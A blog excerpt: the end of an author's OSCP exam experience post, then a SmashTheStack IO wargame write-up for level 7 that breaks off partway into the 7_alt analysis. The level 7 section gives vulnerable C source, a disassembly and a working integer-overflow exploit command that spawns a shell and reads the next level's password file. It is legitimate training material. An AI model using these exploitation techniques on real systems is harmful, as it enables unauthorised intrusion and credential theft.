<p>As you would expect, some machines are very easy to break into and other machines are really quite hard. The beauty of the lab is that, depending on your background, exposure and interests, the machines that you find hard might not be hard for others and vice-versa. Some machines run applications you wouldn&#8217;t expect them to run. Some machines have very new or very old configurations of software. The mix is truly great; it keeps you thinking rather than giving you the luxury of slipping into a &#8220;routine&#8221;.</p>

<p>The lab exposes you to a very large range of exploitations; too many to mention here. Chances are that if a type of exploit exists that you need to abuse, you&#8217;ll get the chance to use it in the lab.</p>

<p>At this point I think it&#8217;s important to point out that in OSCP the focus is on knowing how to apply existing public exploits and known approaches to manual exploitation of vulnerabilities. While there is room for you to construct your own exploits if you choose to, there is another course offered by Offsec which covers that in more detail, and that&#8217;s <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>.</p>

<p>It took me a little bit of time before I realised that exploitation wasn&#8217;t the only thing that I needed to do while in the lab. <em>Post-exploitation</em> was very important. Looting the machines that I&#8217;d compromised was something that I didn&#8217;t consider doing in the early days, and I suffered as a result. When I came to realise that the keys to some of the machines were located on others, I had to go back through my list of popped hosts and loot them properly. If you&#8217;re going to do this course, make sure you do a good job of post-exploitation!</p>

<p>While doing the lab, you are supposed to keep track of all the work you&#8217;ve done as you need to provide a deliverable at the end of it: a full penetration test document. This document has to contain the detail of what you did and how you did it. My advice is to not put this off until the end, but instead work on it as you go. This includes screenshots, dumps of console output, source code to exploits you&#8217;ve written and scripts you&#8217;ve used to automate tasks.</p>

<p>Even though I was pretty good at taking notes, I had kept them all in markdown in a private <a href="http://git-scm.org/" title="Git">git</a> repository instead of putting them in a well-structured document. As a result, I had to do this after my exam, which made the experience more painful than it needed to be.</p>

<h2>Post-Lab</h2>

<p>By then time your lab time has ended, you <em>should</em> have managed to compromise/pop/pwn a large percentage of the networks, if not 100%. In my case, I ran out of time and I missed about 8 machines in total. While I was disappointed with the result, a discussion with various OSCP alumni led me to realise that I had managed to defeat the harder machines in the labs and hence the rest of them would be quite simple. I decided not to extend my lab time as spending extra money for the sake of a few more machines didn&#8217;t make sense. Instead, I booked in my exam for August 6th and used the lead-up time for practice, refining my documentation, and preparing my scripts and cheat sheets for the big day.</p>

<p>There are some great resources out there for practising this kind of thing, but the main one that I want to point out is <a href="http://vulnhub.com/" title="Vulnhub">Vulnhub</a> (a pet project of <a href="http://blog.g0tmi1k.com/" title="g0tmi1k's blog">g0tmi1k</a>). That site contains downloadable <em>boot2root</em> images that you can use to practice on with the added benefit of it all being legal.</p>

<p>I really focused on the areas that I felt I was weakest, with the main one being Linux privilege escalation. There&#8217;s a bit of material out there on it, and there&#8217;s also g0tmi1lk&#8217;s fantastic <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html" title="Basic Linux Privilege Escalation">cheat sheet</a>, but I still failed to connect some of the dots during my travels. It&#8217;s about now I must give a bit hat-tip to <a href="https://twitter.com/pipesec" title="Pipes on Twitter">Pipes</a> and <a href="https://twitter.com/metlstorm" title="Metlstorm on Twitter">Metlstorm</a>, both of <a href="http://www.insomniasec.com/" title="Insomnia Security">Insomnia Security</a>, for being two awesome mentors and providing me with fantastic insights on ways to get root. Those guys are awesome.</p>

<h2>The Exam</h2>

<p>The OSCP exam is a 24-hour &#8220;loser takes all&#8221; style exam. You are given access to a custom network, just like you are in the labs, and you have a number of machines assigned to you. The exam pack contains information on the machines, along with various rules that you must adhere to when attacking them. Each machine is worth a number of points and you earn those points if you:</p>

<ul>
<li>Compromise the host.</li>
<li>Document your findings well enough with clear instructions on how it was done. This document should also contain the  &#8220;flags&#8221;; text files with what appears to be random characters in them which prove that you did what you did.</li>
<li>Don&#8217;t break the rules.</li>
</ul>


<p>Points are allocated to you even if you don&#8217;t managed to get SYSTEM/root on the machine. All is not lost if you can&#8217;t do privilege escalation! However you <em>can not</em> break the rules. In my exam, for example, there was at least one machine which wasn&#8217;t allowed to be attacked at all using <a href="http://metasploit.org/" title="Metasploit">MSF</a>. Breaking this rule would have meant 0 points for that machine.</p>

<p>I started my exam at 8am just as the family were leaving the house (taking son #1 to school). I was buzzing. I couldn&#8217;t sit still I was that excited. I realised how much I had missed my time in the labs and the thought of having another crack was making me twitchy.</p>

<p>By 8:45am I had popped root on my first machine.</p>

<p>By 10:00am the second had fallen. I was on a roll! I was riding high and felt really good.</p>

<p>The third machine proved to be a little more difficult, but it fell just before 1:00pm.</p>

<p>The last two machines, making a total of five, were quite a bit trickier. I&#8217;d say that the fourth was by far the hardest, but I loved it as it was yet another example of where I learned something new while doing something in an Offsec lab. I w00ted like a teenager when it fell and did a victory lap around the house.</p>

<p>By 10pm I was done with all 5 machines. My notes were in the typical markdown/git repository structure but were quite thorough and had captured everything I had done in quite a lot of detail. With the exam out of the way, and 100 points in the bag, I went to bed.</p>

<p>The following day I had the arguably arduous task of writing my exam document, which was supposed to be included with your lab report. All in all my document totalled 220 pages by the time it was done and I was glad to see the back of it! It was submitted late on Wednesday evening but with plenty of time to spare before the 8am Thursday cut-off.</p>

<p>I was done. I was relieved, excited and sad that it was all over.</p>

<h2>Confirmation</h2>

<p>While I was pretty sure that I&#8217;d done a good enough job to get my certification, there is always some doubt that you might have missed something or done something silly. So until I received confirmation from Offsec I wasn&#8217;t sure if I had passed.</p>

<p>It took less than 48 hours for me to receive the email:</p>

<blockquote><p>Dear Oliver,</p>

<p>We are happy to inform you that you have successfully completed the Penetration Testing with BackTrack certification challenge and have obtained your Offensive Security Certified Professional (OSCP) certification.</p>

<p>You will receive the certification by mail within 80 days.</p></blockquote>

<p>I was elated. What a journey! I really felt like I had achieved something. I truly felt, and still feel, that I&#8217;d be able to do a great job performing a penetration test for a client.</p>

<h2>Summary &amp; Conclusion</h2>

<p>There&#8217;s no denying it, OSCP was just fantastic. But same parts of it were <em>hard</em>. Not impossibly hard, but hard enough to make you question your own abilities. It broke my ego and then built it up again. I can&#8217;t recommend it strongly enough!</p>

<p>However if you&#8217;re new to the security game, this probably isn&#8217;t the first thing you should attempt to tackle. I think I managed to get through thanks to my polyglot development background, my history with a mixture of operating systems, and my time reverse engineering various binaries. Without those things I would have had a very, <em>very</em> hard time.</p>

<p>I&#8217;m very happy that I took this challenge on. I feel like I really achieved something and that I have a certification that means a whole more than the paper it&#8217;s written on. I can&#8217;t wait to see the official paperwork come through the mail.</p>

<p>So what&#8217;s next? Certification-wise it has to be <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert">OSCE</a>, but I will give my family a break before I take that on. Work-wise, I will be looking to engage with new and existing clients to determine how best I can help them with the security of their infrastructure and applications in the hope that this becomes a major part of my work longer term.</p>

<p>If you&#8217;re out there reading this and you are looking for some help in this area, please <a href="http://buffered.io/contact" title="Contact OJ">drop me a line</a>.</p>

<p>Thank you all for reading. Feel free to hit me with any questions and I&#8217;ll do my best to answer them.</p>

<p><a href="https://twitter.com/TheColonial" title="OJ on Twitter">OJ</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Levels 7 and 7_alt - IO at STS]]></title>
    <link href="http://buffered.io/posts/levels-7-and-7_alt-io-at-sts/"/>
    <updated>2013-08-15T13:51:00+10:00</updated>
    <id>http://buffered.io/posts/levels-7-and-7_alt-io-at-sts</id>
    <content type="html"><![CDATA[<p>I&#8217;ve been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&#8217;t had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They&#8217;re great fun.</p>

<!--more-->


<h2>Spoiler Alert</h2>

<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven&#8217;t done these levels yourself yet, and you plan to, then please don&#8217;t read this until you&#8217;ve nailed them yourself. I&#8217;d hate for this to ruin your experience.</p>

<p>However, if you&#8217;ve done the level or you&#8217;re just interested in what&#8217;s involved, please read on.</p>

<h2>Connecting</h2>

<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won&#8217;t be sharing passwords here).</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh level7@io.smashthestack.org
</span></code></pre></td></tr></table></div></figure>


<p>Let&#8217;s see what challenges there are for us:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:~<span class="nv">$ </span>ls /levels/level07*
</span><span class='line'>/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
</span></code></pre></td></tr></table></div></figure>


<p>This level has two possible entry points, and we&#8217;ll be covering both in this post.</p>

<h2>Level 07</h2>

<p>We start by looking at the source of the target program:</p>

<figure class='code'><figcaption><span>level07.c  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">//written by bla</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="p">)</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mh">0x574f4c46</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WIN!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>                <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Not today son</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>What&#8217;s clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that&#8217;s written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won&#8217;t be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>

<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>

<p>What&#8217;s interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>disas main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>0x08048414 &lt;main+0&gt;:    push   ebp
</span><span class='line'>0x08048415 &lt;main+1&gt;:    mov    ebp,esp
</span><span class='line'>0x08048417 &lt;main+3&gt;:    sub    esp,0x68
</span><span class='line'>0x0804841a &lt;main+6&gt;:    and    esp,0xfffffff0
</span><span class='line'>0x0804841d &lt;main+9&gt;:    mov    eax,0x0
</span><span class='line'>0x08048422 &lt;main+14&gt;:   sub    esp,eax
</span><span class='line'>0x08048424 &lt;main+16&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'>0x08048427 &lt;main+19&gt;:   add    eax,0x4
</span><span class='line'>0x0804842a &lt;main+22&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'>0x0804842c &lt;main+24&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>0x0804842f &lt;main+27&gt;:   call   0x8048354 &lt;atoi@plt&gt;
</span><span class='line'>0x08048434 &lt;main+32&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
</span><span class='line'>0x08048437 &lt;main+35&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x9
</span><span class='line'>0x0804843b &lt;main+39&gt;:   jle    0x8048446 &lt;main+50&gt;
</span><span class='line'>0x0804843d &lt;main+41&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x1
</span><span class='line'>0x08048444 &lt;main+48&gt;:   jmp    0x80484ad &lt;main+153&gt;
</span><span class='line'>0x08048446 &lt;main+50&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
</span><span class='line'>0x08048449 &lt;main+53&gt;:   shl    eax,0x2                          &lt;- here
</span><span class='line'>0x0804844c &lt;main+56&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
</span><span class='line'>0x08048450 &lt;main+60&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'>0x08048453 &lt;main+63&gt;:   add    eax,0x8
</span><span class='line'>0x08048456 &lt;main+66&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'>0x08048458 &lt;main+68&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'>0x0804845c &lt;main+72&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
</span><span class='line'>0x0804845f &lt;main+75&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>0x08048462 &lt;main+78&gt;:   call   0x8048334 &lt;memcpy@plt&gt;
</span><span class='line'>0x08048467 &lt;main+83&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x574f4c46
</span><span class='line'>0x0804846e &lt;main+90&gt;:   jne    0x804849a &lt;main+134&gt;
</span><span class='line'>0x08048470 &lt;main+92&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048584
</span><span class='line'>0x08048477 &lt;main+99&gt;:   call   0x8048344 &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>0x0804847c &lt;main+104&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x0
</span><span class='line'>0x08048484 &lt;main+112&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804858a
</span><span class='line'>0x0804848c &lt;main+120&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804858d
</span><span class='line'>0x08048493 &lt;main+127&gt;:  call   0x8048324 &lt;execl@plt&gt;
</span><span class='line'>0x08048498 &lt;main+132&gt;:  jmp    0x80484a6 &lt;main+146&gt;
</span><span class='line'>0x0804849a &lt;main+134&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048595
</span><span class='line'>0x080484a1 &lt;main+141&gt;:  call   0x8048344 &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>0x080484a6 &lt;main+146&gt;:  mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x0
</span><span class='line'>0x080484ad &lt;main+153&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>
</span><span class='line'>0x080484b0 &lt;main+156&gt;:  leave
</span><span class='line'>0x080484b1 &lt;main+157&gt;:  ret
</span><span class='line'>End of assembler dump.
</span></code></pre></td></tr></table></div></figure>


<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let&#8217;s have a look at that in action by whipping up a sample program and viewing the output:</p>

<figure class='code'><figcaption><span>Testing Shifts Source  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147483647</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Compile this code with <code>gcc</code> and run it, and you&#8217;ll find the following:</p>

<figure class='code'><figcaption><span>Testing Shifts  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/tc7<span class="nv">$ </span>./a.out
</span><span class='line'>0x80000001
</span><span class='line'>0x4
</span><span class='line'>0x44
</span><span class='line'>0x84
</span></code></pre></td></tr></table></div></figure>


<p>So we can pass in a negative integer, have it shift and turn it into a positive that&#8217;s big enough to overflow the buffer. Once we&#8217;ve overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it&#8217;ll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let&#8217;s see how this looks:</p>

<figure class='code'><figcaption><span>Exploit Run  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:<span class="nv">$ </span>/levels/level07 -2147483600 <span class="sb">`</span>perl -e <span class="s1">&#39;print &quot;\x46\x4c\x4f\x57&quot; x 100&#39;</span><span class="sb">`</span>
</span><span class='line'>WIN!
</span><span class='line'>sh-4.1<span class="nv">$ </span>cat /home/level8/.pass
</span><span class='line'>&lt;&lt; -- password was printed here -- &gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>

<h2>Level 07 alt</h2>

<p>Let&#8217;s start with the source of the alternate application, modified a little by me (and highlighted):</p>

<figure class='code'><figcaption><span>level07_alt.c  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* </span>
</span><span class='line'><span class="cm">    Coding by LarsH</span>
</span><span class='line'>
</span><span class='line'><span class="cm">    PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,</span>
</span><span class='line'><span class="cm">    this program can also be used to get the letter frequencies from a text  &lt;-- I added this</span>
</span><span class='line'><span class="cm">    TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.</span>
</span><span class='line'><span class="cm">    which helps when cracking standard monosubstitution ciphers              &lt;-- I added this</span>
</span><span class='line'>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">count</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s words</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Clear out the frequency buffer */</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Fill the frequency buffer */</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">];</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Print out the frequency buffer */</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c found %i time%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="o">?</span><span class="s">&quot;s&quot;</span><span class="o">:</span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the surface it&#8217;s hard to see where this application could be attacked! It&#8217;s one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


